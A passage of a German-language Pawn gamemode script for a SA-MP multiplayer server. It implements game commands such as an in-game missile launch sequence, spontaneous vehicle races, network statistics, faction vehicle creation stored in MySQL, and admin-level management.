	new moda = GetVehicleModel(temp);
	new Float:x,Float:y,Float:z,Float:r;
	GetVehiclePos(temp,x,y,z);
	GetVehicleZAngle(temp,r);
	new okay = CreateVehicle(moda,x,y,z,r,1,1,-1,1);
	PutPlayerInVehicle(playerid,okay,0);
	new yaya = CreateObject(19288,0.0,0.0,0.0,0,0,0,0);
	AttachObjectToVehicle(yaya,okay,0.6,0.3,0.85,0,0,0);
	DestroyVehicle(temp);
	return 1;
}


/// Raketen Sys
stock IsMissileObject(objectid)
{
	for(new i = 0; i < (sizeof(missileObject)); i++)
	{
	    if(objectid == missileObject[i]) return true;
	    continue;
	}
	return false;
}

stock CreateMissile()
{
	missileObject[0] = CreateObject(17049, 268.81817626953, 1884.0551757813, -19.948799133301, 0, 0, 201.5);
	launchStep = LAUNCH_NONE;
	return 1;
}

stock PrepareMissile()
{
	if(launchStep != LAUNCH_NONE) return 0;
	MoveObject(jetDoor, 259.92041015625, 1884.1022949219, 16.040634155273, 0.5);
	launchStep = LAUNCH_OPENGATE;
	return 1;
}

ocmd:loadmissile(playerid, params[])
{
	if(launchStep != LAUNCH_NOM) return SendClientMessage(playerid, COLOR_RED, "[*] That's a negative. Missile does already exists.");
	CreateMissile();
	SendClientMessage(playerid, COLOR_GREEN, "[*] Copy. Missile is now avaible");
	return 1;
}

ocmd:preparemissile(playerid, params[])
{
	//if(launchStep != LAUNCH_NONE) return SendClientMessage(playerid, COLOR_RED, "[*] Negative. Missile doesn't exists or is loading/prepar[ing/ed]/launched already.");
	if(launchStep != LAUNCH_NONE) return SendClientMessage(playerid, COLOR_RED, "[*] Rakete wird gerade vorbereitet, startet gerade oder existiert nicht.");
	PrepareMissile();
	SendClientMessage(playerid, COLOR_GREEN, "[*] Die Rakete wird für den Start vorbereitet. Bitte warten....");
	return 1;
}

ocmd:launchmissile(playerid, params[])
{
	/*
	if(gettime() < RaketenSys[ZeitBisUsed])
	{
		//new RaketenZeit = RaketenSys[ZeitBisUsed];
		new timebanned = RaketenSys[ZeitBisUsed]-gettime();
		new str[256];

    	new tage = timebanned / 86400;
		timebanned -= tage * 86400;
		new stunden = timebanned / 3600;
		timebanned -= stunden * 3600;
		new minuten = timebanned / 60;
		timebanned -= minuten * 60;
		new sekunden = timebanned;

		if(tage > 0) format(str,sizeof(str),"Die Rakete kann erst wieder in %i Tagen, %i Stunden und %i Minuten benutzt werden!",tage,stunden,minuten);
		else if(stunden > 0) format(str,sizeof(str),"Die Rakete kann erst wieder in %i Stunden, %i Minuten und %i Sekunden benutzt werden!",,stunden,minuten,sekunden);
		else if(minuten > 0) format(str,sizeof(str),"Die Rakete kann erst wieder in %i Minuten und %i Sekunden benutzt werden!",minuten,sekunden);
		else format(str,sizeof(str),"Die Rakete kann erst wieder in %i Sekunden benutzt werden!",sekunden);
		SCM(playerid,-1,str);
	}
				*/



	if(launchStep != LAUNCH_READY) return SendClientMessage(playerid, COLOR_RED, "[*] Rakete ist nicht bereit oder bereits gestartet.");
//	if(launchStep == LAUNCH_GO) return SendClientMessage(playerid, COLOR_RED, "[*] Rakete ist nicht bereit oder bereits gestartet.");

//	if(CheckPointSetted[playerid] == 0) return SendClientMessage(playerid, COLOR_RED, "Du hast nix markiert auf der Map");
	if(RaketenSys[RaketenZiel]==0) return SendClientMessage(playerid, COLOR_RED, "[*] Die Rakete hat kein Ziel.");
//	SendClientMessage(playerid, COLOR_GREEN, "[*] Affirmative. Countdown in progress. Stay out of the missile.");
    SendClientMessage(playerid, COLOR_GREEN, "[*] Countdown startet.");

	GameTextForPlayer(playerid, "~w~Rakete startet in ~r~5 ~w~seconds", 5000, 3);
	launchTimer = SetTimer("LaunchMissile", 5000, false);

	return 1;
}
/*
enum RaketenSyss
{
	RaketeGestartet,
	Float:ZielX,
	Float:ZielY,
	Float:ZielZ,
	RaketenZiel
}

new RaketenSys[RaketenSyss];*/
forward LaunchMissile();
public LaunchMissile()
{
	if(launchStep != LAUNCH_READY || launchStep == LAUNCH_GO) return 0;
	new Float:objPos[3];
	for(new i = 0; i < (sizeof(missileObject)); i++)
	{
		GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
		MoveObject(missileObject[i], objPos[0], objPos[1], objPos[2] + 1.5, 0.3);
	}
	launchStep = LAUNCH_GO;
	RaketenSys[RaketeGestartet]=1;

	new jahr,monat,tag,zeitdauer;
    getdate(jahr,monat,tag);
    zeitdauer = gettime()+(60*60*24*14);
    RaketenSys[ZeitBisUsed] = zeitdauer;

	return 1;
}
/*
ocmd:cancelmissile(playerid, params[])
{
	if(launchStep == LAUNCH_NOM || launchStep == LAUNCH_NONE) return SendClientMessage(playerid, COLOR_RED, "[*] Negative. Nothing to cancel.");
	if(launchStep == LAUNCH_OPENGATE)
	{
	    launchStep = LAUNCH_NONE;
	    MoveObject(jetDoor, 268.62051391602, 1884.1695556641, 16.040634155273, 0.5);
	    SendClientMessage(playerid, COLOR_GREEN, "[*] Roger. Closing gate.");
	}
	else if(launchStep == LAUNCH_LIFTUP || launchStep == LAUNCH_READY)
	{
	    launchStep = LAUNCH_CLIFT;
	    MoveObject(lift, 264.57867431641, 1888.5306396484, -20.273397445679, 1.5);
	    MoveObject(missileObject[0], 268.81817626953, 1884.0551757813, -19.948799133301, 1.5);
	    SendClientMessage(playerid, COLOR_GREEN, "[*] 10-4. Missile going down, gates are closing.");
	    if(IsValidObject(missileObject[1])) for(new i = 1; i < (sizeof(missileObject)); i++) DestroyObject(missileObject[i]);
	    if(launchTimer != -1)
	    {
	        KillTimer(launchTimer);
	        launchTimer = (-1);
	        GameTextForPlayer(playerid, "~r~Mission aborted", 3000, 3);
		}
	}
	else if(launchStep >= LAUNCH_GO)
	{
	    new Float:objPos[3];
	    launchStep = LAUNCH_NOM;
	    SendClientMessage(playerid, COLOR_RED, "[*] Affirmative. Missile was launched already, destroying it.");
		MoveObject(lift, 264.57867431641, 1888.5306396484, -20.273397445679, 1.5);
        MoveObject(jetDoor, 268.62051391602, 1884.1695556641, 16.040634155273, 0.5);
		for(new i = 0; i < (sizeof(missileObject)); i++)
		{
		    GetObjectPos(missileObject[i], objPos[0], objPos[1], objPos[2]);
			DestroyObject(missileObject[i]);
			CreateExplosion(objPos[0], objPos[1], objPos[2], 7, 15);
		}
		GameTextForPlayer(playerid, "~r~Mission aborted: Self destruction", 3000, 3);
	}
	return 1;
}

ocmd:gotomissile(playerid, params[])
	return SetPlayerPos(playerid, 266.3893737793, 1877.22265625, 17.648057937622);*/

//


Function UpdateXYZ(target)
{
	if(target != INVALID_PLAYER_ID)
	{
	    new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(target, tempposx, tempposy, tempposz);
		RaketenSys[PlayerZielX] = tempposx;
		RaketenSys[PlayerZielY] = tempposy;
		RaketenSys[PlayerZielZ] = tempposz;
		/*
		PublicX=tempposx;
		PublicX=tempposy;

		PublicZ=tempposz;*/

	}
}




ocmd:rakete(playerid,params[]) // alle 2 wochen
{
	if(!IsPlayerInRangeOfPoint(playerid,10.0,266.3893737793, 1877.22265625, 17.648057937622)) return SCM(playerid,-1,"Du bist nicht in der nähe der Rakete!");
	if(PlayerInfo[playerid][pLeader] !=3) return SCM(playerid,-1,"Du bist nicht der Army Leader!");
	if(launchStep == LAUNCH_GO) return SendClientMessage(playerid, COLOR_RED, "[*] Rakete ist gestartet und kann nicht modifiziert werden.");
	ShowPlayerDialog(playerid,DIALOG_RAKETE,DIALOG_STYLE_LIST,"Rakete","Rakete vorbereiten\nZiel auswählen\nRakete abfeuern","Ausführen","Abbrechen");
	return 1;
}

stock IsABoot(tmodelid)
{
	if(tmodelid == 430 || tmodelid == 446 || tmodelid == 452 || tmodelid == 453|| tmodelid == 454|| tmodelid == 472|| tmodelid == 473|| tmodelid == 484 || tmodelid == 493|| tmodelid == 430|| tmodelid == 595)return 1;
	else return 0;
}
stock IsAnAirplane(tmodelidd)
{
	if(tmodelidd == 460 || tmodelidd == 476 || tmodelidd == 511 || tmodelidd == 512|| tmodelidd == 513|| tmodelidd == 519|| tmodelidd == 520|| tmodelidd == 553 || tmodelidd == 577|| tmodelidd == 592|| tmodelidd == 593)return 1;
	else return 0;
}
stock IsAHelikoter(tkopta)
{
	if(tkopta == 417 || tkopta == 425 || tkopta == 447 || tkopta == 469|| tkopta == 487|| tkopta == 488|| tkopta == 497|| tkopta == 548 || tkopta == 563)return 1;
	else return 0;
}
ocmd:spontanrennen(playerid,params[])
{
	if(WantedLevel[playerid]>2) return SCM(playerid,-1,"Dein Wantedlevel ist zu hoch!");
	if(GetPlayerState(playerid)!=PLAYER_STATE_DRIVER) return SCM(playerid,-1,"Du bist nicht der Fahrer eines Fahrzeuges!");
	if(CPRennenSetted[playerid]!=1) return SCM(playerid,-1,"Du hast kein Ziel auf der Map gesetzt!");
	new modelid = GetVehicleModel(GetPlayerVehicleID(playerid));

	new pid,erloes,string[128];
    if(sscanf(params, "ud", pid,erloes)) return SendClientMessage(playerid, COLOR_GREY, "/spontanrennen [PlayerID] [Wette]");
    if(WantedLevel[pid] >2) return SCM(playerid,-1,"Der Spieler hat zu viele Wnateds!");
    if(!IsPlayerInAnyVehicle(pid)) return SCM(playerid,-1,"Der Spieler sitzt in keinem Fahrzeug.");
    new pidmodelid = GetVehicleModel(GetPlayerVehicleID(pid));
	if(IsABoot(modelid))
	{
	    RennenFArt[playerid] = 2;
	    RennenFArt[pid] = 2;
	}
	else if(IsAnAirplane(modelid))
	{
	    RennenFArt[playerid] = 3;
	    RennenFArt[pid] = 3;
	}
	else if(IsAHelikoter(modelid))
	{
	    RennenFArt[playerid] = 4;
	    RennenFArt[pid] = 4;
	}
	else
	{
	    RennenFArt[playerid] = 1;
	    RennenFArt[pid] = 1;
	}

	if(IsABoot(pidmodelid))
	{
	    RennenFArt[pid] = 2;
	}
	else if(IsAnAirplane(pidmodelid))
	{
	    RennenFArt[pid] = 3;
	}
	else if(IsAHelikoter(pidmodelid))
	{
	    RennenFArt[pid] = 4;
	}
	else
	{
	    RennenFArt[pid] = 1;
	}

	if(RennenFArt[playerid] != RennenFArt[pid]) return SCM(playerid,-1,"Dein Gegner sitzt nicht im gleichem VehikelTyp wie du Auto/Boot/Helikopter/Flugzeug");
	if(CPRennenSetted[playerid] == 0) return SCM(playerid,-1,"Du hast kein Ziel auf der Karte markiert. (Du musst dafür in einem Fahrzueg sitzen!)");


//		new Float:x, Float:y, Float:z;
	new LocationZone[MAX_ZONE_NAME];



	Get2DZone(RennenX[playerid],RennenY[playerid], LocationZone, MAX_ZONE_NAME);




	format(string, sizeof(string), "Du hast %s für ein Spontanrennen nach %s herausgefordert, Wette: %d$", GetName(pid),LocationZone,erloes);
	SCM(playerid,-1,string);

	format(string, sizeof(string), "%s hat dich für ein Spontanrennen nach %s herausgefordert, Wette: %d$ /accept rennen", GetName(playerid),LocationZone,erloes);
	SCM(pid,-1,string);
	RennenHerausforderer[pid] = playerid;
	SetPVarInt(playerid,"Wette",erloes);
	return 1;
}







ocmd:netstats(playerid, params[])
{
	new pid,from[50];
     // new connectedtime = NetStats_GetConnectedTime(playerid);
    new messagesrecieved = NetStats_MessagesReceived(playerid);
    new bytesrecieved = NetStats_BytesReceived(playerid);
    new messagessent = NetStats_MessagesSent(playerid);
    new bytessent = NetStats_BytesSent(playerid);
    new mrps = NetStats_MessagesRecvPerSecond(playerid);
   //	new packetloss = NetStats_PacketLossPercent(playerid);
    new connectionstats = NetStats_ConnectionStatus(playerid);
    new string[512];
   	if(sscanf(params,"u", pid))
   	{
    	format(string, sizeof string, "'COL_W'Time Connected: %i \nNetwork Messages Sent: %i \nBytes Sent: %i \nMessages Recieved: %i \nBytes Recieved: %i \nMessages Sent Last Second: %i \nPackets lost: %.2f% \nConnection Status: %i\nPing: %i", NetStats_GetConnectedTime(playerid), messagesrecieved, bytesrecieved, messagessent, bytessent, mrps, NetStats_PacketLossPercent(playerid), connectionstats,GetPlayerPing(playerid));
		ShowPlayerDialog(playerid, 3, DIALOG_STYLE_MSGBOX,"{44A1D0}Net Stats{FFFFFF}:",string,"OK","");
    	return 1;
	}
    else
    {
        new messagesrecieved2 = NetStats_MessagesReceived(pid);
    	new bytesrecieved2 = NetStats_BytesReceived(pid);
    	new messagessent2 = NetStats_MessagesSent(pid);
    	new bytessent2 = NetStats_BytesSent(pid);
    	new mrps2 = NetStats_MessagesRecvPerSecond(pid);
    	new connectionstats2 = NetStats_ConnectionStatus(pid);
    	format(from, sizeof(from), "{44A1D0}Net Stats{FFFFFF} from %s:", GetName(pid));
        format(string, sizeof string, "'COL_W'Time Connected: %i \nNetwork Messages Sent: %i \nBytes Sent: %i \nMessages Recieved: %i \nBytes Recieved: %i \nMessages Sent Last Second: %i \nPackets lost: %.2f% \nConnection Status: %i\nPing: %i", NetStats_GetConnectedTime(playerid), messagesrecieved2, bytesrecieved2, messagessent2, bytessent2, mrps2, NetStats_PacketLossPercent(pid), connectionstats2,GetPlayerPing(pid));
		ShowPlayerDialog(playerid, 3, DIALOG_STYLE_MSGBOX,from,string,"OK","");
    	return 1;
	}
}


Function RennStart(playerid)
{
    if(RennenHerausforderer[playerid] != INVALID_PLAYER_ID)
   	{
   	    new pid = RennenHerausforderer[playerid];
   	    SetPlayerRaceCheckpoint(playerid,1,RennenX[pid],RennenY[pid],RennenZ[pid],0.0,0.0,0.0,12.0);
   	    SetPlayerRaceCheckpoint(pid,1,RennenX[pid],RennenY[pid],RennenZ[pid],0.0,0.0,0.0,12.0);

	//	GameTextForAll("Na LOS DU HURENSOHN",2);
   	}
   	return 1;

}









// To Do List 2k19


// Fraktionsfahrzeuge auf MySQL

// CTF System





// Fraktionsfahrzeuge auf MySQL //




/*
forward SaveFrakCars(frakcarid);
public SaveFrakCars(frakcarid)
{
    new query[512];
	format(query, sizeof(query), "UPDATE `orgautos` SET orgautox = '%f',orgautoy = '%f',orgautoz = '%f',orgautor = '%f',orgautocolor = '%d',orgautocolor2 = '%d',orgautokaufpreis WHERE `autoid` = '%d'",  // org id wird ja direkt inserted
	OrgAuto[theorgcarid][orgautox],OrgAuto[theorgcarid][orgautoy],OrgAuto[theorgcarid][orgautoz],OrgAuto[theorgcarid][orgautor],
	OrgAuto[theorgcarid][orgautocolor],OrgAuto[theorgcarid][orgautocolor2],OrgAuto[theorgcarid][orgautokaufpreis],OrgAuto[theorgcarid][orgautodbid]);
	printf(query);
	mysql_function_query(mysqlcon,query, false, "", "");
	SendClientMessageToAll(-1,"Okay!");


	return 1;
}





stock FrakCarErstellen(playerid,frakid,autoid,autopreis)
{
    new fc = getFreeorgautoid();

	   			OrgAuto[fc][orgvehtype] = autoid;
	    		new Float:fX,Float:fY,Float:fZ,Float:fA;
	    		GetPlayerPos(playerid,fX,fY,fZ),GetPlayerFacingAngle(playerid,fA);

	  	 		OrgAuto[fc][orgautox] = fX;
	    		OrgAuto[fc][orgautoy] = fY;
	    		OrgAuto[fc][orgautoz] = fZ;
	    		OrgAuto[fc][orgautor] = fA;
	    		OrgAuto[fc][orgautocolor] = 1;
	   			OrgAuto[fc][orgautocolor2] = 1;

	   			OrgAuto[fc][autoorgid] = orgid;



				//FactionCars[fc][fPrice] = 0;

				OrgAuto[fc][LocalID] = CreateVehicle(OrgAuto[fc][orgvehtype],OrgAuto[fc][orgautox],OrgAuto[fc][orgautoy],OrgAuto[fc][orgautoz],OrgAuto[fc][orgautor],OrgAuto[fc][orgautocolor],OrgAuto[fc][orgautocolor2],-1, 0);
				//Gas[FactionCars[fc][fCarid]] = 80;
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast das Organisations Fahrzeug erfolgreich gekauft!");
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"Vergesse es nicht mit '/parken' umzuparken.");
				PutPlayerInVehicle(playerid,OrgAuto[fc][LocalID],0);
				OrgInfo[orgid][FahrzeugeRows]++;
				OrgInfo[orgid][OrgKasse]-=autopreis;
				SaveORGcarToDB(fc);

}*/
ocmd:efa(playerid,params[]){  /// FactionCars[fc][fVehid] wird verwendet irgendwo noch... oder ?
	        if(PlayerInfo[playerid][pAdmin] == 2002)
			{
				new vehid,col1,col2,fracid,ucsirene;
		    	if(sscanf(params,"ddddd",vehid,col1,col2,fracid,ucsirene)) return SendClientMessage(playerid,FACTION_COL_GREY,"Benutze: '/efa [Model] [Farbe(1)] [Farbe(2)] [Hauptfraktion] [UCL]'.");
				if(vehid < 400 || vehid > 611) return SendClientMessage(playerid,FACTION_COL_GREY,"Vehicle-ID nur von 400 bis 611.");
				if(col1 < 0 || col1 > 255) return SendClientMessage(playerid,FACTION_COL_GREY,"Falsche Farbe(1)!");
				if(col2 < 0 || col2 > 255) return SendClientMessage(playerid,FACTION_COL_GREY,"Falsche Farbe(2)!");
				if(fracid <1 || fracid > 24) return SCM(playerid,-1,"FracID nicht kleiner als 1 oder höher als 25!"); // falls 0 oder höher als 25
				if(ucsirene <0 || ucsirene > 1) return SCM(playerid,-1,"UCL Light 1 = AN || 0 = AUS");
			//	new fc = getFreeFrakCarID();
			//	printf("Freie FC: %d",fc);
	   		//	OrgAuto[fc][orgvehtype] = vehid;


	   		    for(new fc=0; fc<sizeof(FactionCars); fc++)
				{
					if(FactionCars[fc][fVehid] != 0) continue;
		    		new Float:fX,Float:fY,Float:fZ,Float:fA;
		    		GetPlayerPos(playerid,fX,fY,fZ),GetPlayerFacingAngle(playerid,fA);

		  	 //		OrgAuto[fc][orgautox] = fX;
		    //		OrgAuto[fc][orgautoy] = fY;
		    //		OrgAuto[fc][orgautoz] = fZ;
		    //		OrgAuto[fc][orgautor] = fA;
		    		FactionCars[fc][fVehid] = vehid;

		    		FactionCars[fc][fPos][0] = fX;
		    		FactionCars[fc][fTuning][16] = 100;
	     			FactionCars[fc][fPos][1] = fY;
	      			FactionCars[fc][fPos][2] = fZ;
	       			FactionCars[fc][fPos][3] = fA;
	        		FactionCars[fc][fCol][0] = col1;
	       			FactionCars[fc][fCol][1] = col2;
	                FactionCars[fc][fFaction] = fracid;
	                FactionCars[fc][fPrice] = 0;

	                FactionCars[fc][UCLSirene] = ucsirene;
	/*
	                for(new f;f<5;f++){
		                		FactionCars[fc][fFaction][f] = faction[f];
		            		}*/
	                for(new mood;mood<16;mood++)
	                {
						FactionCars[fc][fTuning][mood] = 0;}


	                FactionCars[fc][fCarid] = CreateVehicle(FactionCars[fc][fVehid],FactionCars[fc][fPos][0],FactionCars[fc][fPos][1],FactionCars[fc][fPos][2],FactionCars[fc][fPos][3],FactionCars[fc][fCol][0],FactionCars[fc][fCol][1],-1, FactionCars[fc][UCLSirene]);

		    	//	OrgAuto[fc][orgautocolor] = col1;
	//	   			OrgAuto[fc][orgautocolor2] = col2;

	//	   			OrgAuto[fc][autoorgid] = orgid;



					//FactionCars[fc][fPrice] = 0;

				//	OrgAuto[fc][LocalID] = CreateVehicle(OrgAuto[fc][orgvehtype],OrgAuto[fc][orgautox],OrgAuto[fc][orgautoy],OrgAuto[fc][orgautoz],OrgAuto[fc][orgautor],OrgAuto[fc][orgautocolor],OrgAuto[fc][orgautocolor2],-1, 0);
					//Gas[FactionCars[fc][fCarid]] = 80;
					SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast das Fraktions Fahrzeug erfolgreich erstellt.");
					SendClientMessage(playerid,COLOR_LIGHTBLUE,"Vergesse es nicht mit '/parken' umzuparken.");
					PutPlayerInVehicle(playerid,FactionCars[fc][fCarid],0);
					SaveFrakCarToDB(playerid,fc);
		   			return 1;
				}
			}else SendClientMessage(playerid,FACTION_COL_GREY,"Du bist nicht berechtigt diesen Befehl anzuwenden.");
			return 1;
}

forward SaveFrakCarToDB(playerid,fc);
public SaveFrakCarToDB(playerid,fc)
{
	new query[512],Content[512];
	/*
	format(Content,sizeof(Content),"%d %.3f %.3f %.3f %.3f %03d %03d %02d %02d %02d %02d %02d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d",
			FactionCars[fc][fVehid],
			FactionCars[fc][fPos][0],
			FactionCars[fc][fPos][1],
			FactionCars[fc][fPos][2],
			FactionCars[fc][fPos][3],
			FactionCars[fc][fCol][0],
			FactionCars[fc][fCol][1],
			FactionCars[fc][fFaction][0],
			FactionCars[fc][fFaction][1],
			FactionCars[fc][fFaction][2],
			FactionCars[fc][fFaction][3],
			FactionCars[fc][fFaction][4],
			FactionCars[fc][fTuning][0],
	        FactionCars[fc][fTuning][1],
	        FactionCars[fc][fTuning][2],
	        FactionCars[fc][fTuning][3],
	        FactionCars[fc][fTuning][4],
	        FactionCars[fc][fTuning][5],
	        FactionCars[fc][fTuning][6],
	        FactionCars[fc][fTuning][7],
	        FactionCars[fc][fTuning][8],
	        FactionCars[fc][fTuning][9],
	        FactionCars[fc][fTuning][10],
            FactionCars[fc][fTuning][11],
            FactionCars[fc][fTuning][12],
            FactionCars[fc][fTuning][13],
            FactionCars[fc][fTuning][14],
            FactionCars[fc][fTuning][15],
            FactionCars[fc][fTuning][16],
            FactionCars[fc][fTuning][17],
			FactionCars[fc][fPrice]);*/



    format(query,sizeof(query),"INSERT INTO FraktionsVehikels (fVehid,fPosx,fPosy,fPosz,fPosr,fCol,fCol2,fFaction,fPrice) VALUES ('%d','%f','%f','%f','%f','%d','%d','%d','%d')",
	FactionCars[fc][fVehid],FactionCars[fc][fPos][0],FactionCars[fc][fPos][1],FactionCars[fc][fPos][2],FactionCars[fc][fPos][3],FactionCars[fc][fCol][0],FactionCars[fc][fCol][1],FactionCars[fc][fFaction],FactionCars[fc][fPrice]);
	mysql_pquery(mysqlcon, query, "OnFrakAutoCreated", "ii", playerid,fc);




   // mysql_function_query(mysqlcon,query,true,"OnORGCreated","is",playerid,organisation);*/







    //mysql_function_query(mysqlcon,query,true,"OnORGAutoCreated","i",fc);
    return 1;
}

forward UpdateFrakCar(fc);
public UpdateFrakCar(fc)
{
	new query[512];
    format(query,sizeof(query),"UPDATE FraktionsVehikels SET fPosx='%f',fPosy='%f',fPosz='%f',fPosr='%f',fCol='%d',fCol2='%d',fFaction='%d',fPrice='%d' WHERE factioncardbid ='%d'",
	FactionCars[fc][fPos][0],FactionCars[fc][fPos][1],FactionCars[fc][fPos][2],FactionCars[fc][fPos][3],FactionCars[fc][fCol][0],FactionCars[fc][fCol][1],FactionCars[fc][fFaction],FactionCars[fc][fPrice],FactionCars[fc][factioncardbid]);
	mysql_pquery(mysqlcon, query);




	format(query,sizeof(query),"UPDATE FraktionsVehikels SET fTuning0='%d',fTuning1='%d',fTuning2='%d',fTuning3='%d',fTuning4='%d',fTuning5='%d',fTuning6='%d',fTuning7='%d',fTuning8='%d',fTuning9='%d',fTuning10='%d',fTuning11='%d',fTuning12='%d',fTuning13='%d',fTuning14='%d',fTuning15='%d',fTuning16='%d',fTuning17='%d' WHERE factioncardbid ='%d'",
	FactionCars[fc][fTuning][0],FactionCars[fc][fTuning][1],FactionCars[fc][fTuning][2],FactionCars[fc][fTuning][3],FactionCars[fc][fTuning][4],FactionCars[fc][fTuning][5],FactionCars[fc][fTuning][6],FactionCars[fc][fTuning][7],FactionCars[fc][fTuning][8],FactionCars[fc][fTuning][9],FactionCars[fc][fTuning][10],FactionCars[fc][fTuning][11],FactionCars[fc][fTuning][12],
	FactionCars[fc][fTuning][13],FactionCars[fc][fTuning][14],FactionCars[fc][fTuning][15],FactionCars[fc][fTuning][16],FactionCars[fc][fTuning][17],FactionCars[fc][factioncardbid]);
	mysql_pquery(mysqlcon, query);
	return 1;
}
/*

FactionCars[fc][fVehid],
			FactionCars[fc][fPos][0],
			FactionCars[fc][fPos][1],
			FactionCars[fc][fPos][2],
			FactionCars[fc][fPos][3],
			FactionCars[fc][fCol][0],
			FactionCars[fc][fCol][1],
			FactionCars[fc][fFaction][0],
			FactionCars[fc][fFaction][1],
			FactionCars[fc][fFaction][2],
			FactionCars[fc][fFaction][3],
			FactionCars[fc][fFaction][4],


			FactionCars[fc][fTuning][0],
	        FactionCars[fc][fTuning][1],
	        FactionCars[fc][fTuning][2],
	        FactionCars[fc][fTuning][3],
	        FactionCars[fc][fTuning][4],
	        FactionCars[fc][fTuning][5],
	        FactionCars[fc][fTuning][6],
	        FactionCars[fc][fTuning][7],
	        FactionCars[fc][fTuning][8],
	        FactionCars[fc][fTuning][9],
	        FactionCars[fc][fTuning][10],
            FactionCars[fc][fTuning][11],
            FactionCars[fc][fTuning][12],
            FactionCars[fc][fTuning][13],
            FactionCars[fc][fTuning][14],
            FactionCars[fc][fTuning][15],
            FactionCars[fc][fTuning][16],
            FactionCars[fc][fTuning][17],
			FactionCars[fc][fPrice]);
            fwrite(fFile,Content);
            if(destroy == true){
                if(DestroyVehicle(FactionCars[fc][fCarid]))*/












forward OnFrakAutoCreated(playerid,fc);
public OnFrakAutoCreated(playerid,fc)
{
	new query[512];

	//FactionCars[fc][factioncardbid] = cache_insert_id();
    new cid = cache_insert_id();
	FactionCars[fc][factioncardbid] = cid;
	printf("playerid: %d / fc: %d / cid: %d / factioncardbid: %d", playerid, fc, cid, FactionCars[fc][factioncardbid]);

//	SCM(playerid,-1,"Die dunkle tat ist nun vollbracht.");


//mysql FORMAT
    format(query,sizeof(query),"UPDATE FraktionsVehikels SET fTuning0='%d',fTuning1='%d',fTuning2='%d',fTuning3='%d',fTuning4='%d',fTuning5='%d',fTuning6='%d',fTuning7='%d',fTuning8='%d',fTuning9='%d',fTuning10='%d',fTuning11='%d',fTuning12='%d',fTuning13='%d',fTuning14='%d',fTuning15='%d',fTuning16='%d',fTuning17='%d' WHERE factioncardbid ='%d'",
	FactionCars[fc][fTuning][0],FactionCars[fc][fTuning][1],FactionCars[fc][fTuning][2],FactionCars[fc][fTuning][3],FactionCars[fc][fTuning][4],FactionCars[fc][fTuning][5],FactionCars[fc][fTuning][6],FactionCars[fc][fTuning][7],FactionCars[fc][fTuning][8],FactionCars[fc][fTuning][9],FactionCars[fc][fTuning][10],FactionCars[fc][fTuning][11],FactionCars[fc][fTuning][12],
	FactionCars[fc][fTuning][13],FactionCars[fc][fTuning][14],FactionCars[fc][fTuning][15],FactionCars[fc][fTuning][16],FactionCars[fc][fTuning][17],FactionCars[fc][factioncardbid]);
	printf("VorPQuery:%s",query);
	mysql_pquery(mysqlcon, query, "", "");
	printf("NachPQuery:%s",query);
	SCM(playerid,-1,"ok.");




/*
	for( new u; u < MAX_PLAYERS; u++ )
	{
	    if(u != INVALID_PLAYER_ID)
	    {
    		PlayAudioStreamForPlayer(u, "https://blanknamedddddd.000webhostapp.com/SpongeBob_ - Ich (mp3cut.net).mp3" );
		}
	}*/
	return 1;
}


//getFreeFrakCarID
/*format(query,sizeof(query),"INSERT INTO FraktionsVehikels (fTuning0,fTuning1,fTuning2,fTuning3,fTuning4,fTuning5,fTuning6,fTuning7,fTuning8,fTuning9,fTuning10,fTuning11,fTuning12,fTuning13,fTuning14,fTuning15,fTuning16,fTuning17) VALUES ('%d','%d','%d','%d','%d','%d','%d','%d','%d','%d','%d','%d','%d','%d','%d','%d','%d','%d')",
	FactionCars[fc][fTuning][0],FactionCars[fc][fTuning][1],FactionCars[fc][fTuning][2],FactionCars[fc][fTuning][3],FactionCars[fc][fTuning][4],FactionCars[fc][fTuning][5],FactionCars[fc][fTuning][6],FactionCars[fc][fTuning][7],FactionCars[fc][fTuning][8],FactionCars[fc][fTuning][9],FactionCars[fc][fTuning][10],FactionCars[fc][fTuning][11],FactionCars[fc][fTuning][12],
	FactionCars[fc][fTuning][12],FactionCars[fc][fTuning][13],FactionCars[fc][fTuning][14],FactionCars[fc][fTuning][15],FactionCars[fc][fTuning][16],FactionCars[fc][fTuning][17]);
	mysql_pquery(mysqlcon, query, "OnFrakAutoCreated", "ii", playerid,fc);*/

getFreeFrakCarID()
{
	for(new i=0; i<sizeof(FactionCars); i++)
	{
	   if(FactionCars[i][factioncardbid]==-1) return i;
	}
	ABroadCast(0xFF0000FF, "Error: Maximale Anzahl an Frak Autos erreicht.",1);

	return -1;
}



ocmd:offsetadmin(playerid,params[])
{

    if(!IsPlayerAdminYet(playerid)) return SendClientMessage(playerid,-1,"Du kannst diesen Befehl nicht nutzen!");
    if(IsPlayerAdminYet(playerid) && PlayerInfo[playerid][pAdmin]<2000) return SendClientMessage(playerid,-1,"Nur Head Admins+ können diesen Befehl nutzen.");

	new name[MAX_PLAYER_NAME],level,string[128];
	if(sscanf(params,"sd", name, level)) return SCM(playerid,COLOR_GREY,"Benutzung: /setadmin [exakter Name] [AdmLvl]");



	//if(level <0 || level>=13) return GameTextForPlayer(playerid, "~s~/setadmin~n~~g~(ACCOUNTID) (ADMINLEVEL)", 5000, 3); //Hier war ein ~ zu viel = Crash
	if(level>4 && PlayerInfo[playerid][pAdmin]<2001) return SendClientMessage(playerid,-1,"Als Head Admin kannst du nur Supporter einstellen.");
	if(level>1338 && PlayerInfo[playerid][pAdmin]<2002) return SendClientMessage(playerid,-1,"Du bist nicht berechtigt.");
	new pid = getOnlineName(name);
	if(IsPlayerConnected(pid))  // you cant set a head admin lvel
	/*{
	    if(PlayerInfo[pid][pAdmin]<level)
	    {
	        if(pid == playerid && PlayerInfo[playerid][pAdmin]<12) return SendClientMessage(playerid,COOLRED,"You can't change your own Admin Level!");
	        if(PlayerInfo[pid][pAdmin] > PlayerInfo[playerid][pAdmin]) return SendClientMessage(playerid,COOLRED,"You can't change the Admin-Level of this Player!");
			PlayerInfo[pid][pAdmin] = level;
			format(string, sizeof(string), "ADMIN: %s hat den Admin Rang von %s auf <%d> gesetzt. ", GetName(playerid),GetName(pid),level);
			ABroadCast(COLOR_GREY,string,1);

			return 1;
		}
		else
		{
		    if(pid == playerid && PlayerInfo[playerid][pAdmin]<12) return SendClientMessage(playerid,COOLRED,"You can't change your own Admin Level!");
